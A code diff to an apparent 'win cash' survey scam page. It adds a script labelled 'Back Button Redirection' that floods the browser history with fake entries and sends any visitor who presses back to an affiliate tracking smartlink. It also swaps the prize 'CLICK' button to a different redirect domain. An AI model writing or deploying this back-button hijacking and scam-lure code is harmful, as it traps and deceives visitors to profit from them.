@@ -29,7 +29,26 @@
     }
     document.head.appendChild(s);
 </script>
-    
+
+<script type="text/javascript">
+        // BBR (Back Button Redirection)
+        var back_ntb_link = 'https://app.impih.com/?utm_medium=a049de707e16aec53009ccb6d1f483b5325a5931&utm_campaign=ng_smartlink_20240522&1=BBR';
+        if (typeof back_ntb_link !== 'undefined' && back_ntb_link !== null) {
+            !(function() {
+                var t;
+                try {
+                    const URL = window.location.href.split(/[#]/)[0];
+                    for (t = 0; 10 > t; ++t) history.pushState({}, '', URL + '#');
+                    onpopstate = function(event) {
+                        event.state && location.replace(back_ntb_link);
+                    };
+                } catch (o) {
+                    console.log(o);
+                }
+            })();
+        }
+
+	    
     
     </head>
 <body onclick="">
@@ -57,7 +76,7 @@
 <div id="questionFour" style="display:none;">
 <p class="lead"><img src="img/checkmark.png" class="img-responsive" style="margin: 0 auto;" alt="" /> <br />Thank You!!!</p>
 <p>Click on the button below and go to win cash</p>
-<a style="text-decoration: none;" id="calert" class="btn btn-success btn-lg btn-block" href="https://t2.surpriseanddelightgifts.com/click">CLICK</a><br /><br /></div>
+<a style="text-decoration: none;" id="calert" class="btn btn-success btn-lg btn-block" href="https://k3.maxconvv.com/click">CLICK</a><br /><br /></div>
 </div>
 </div>
 <script type="text/javascript">
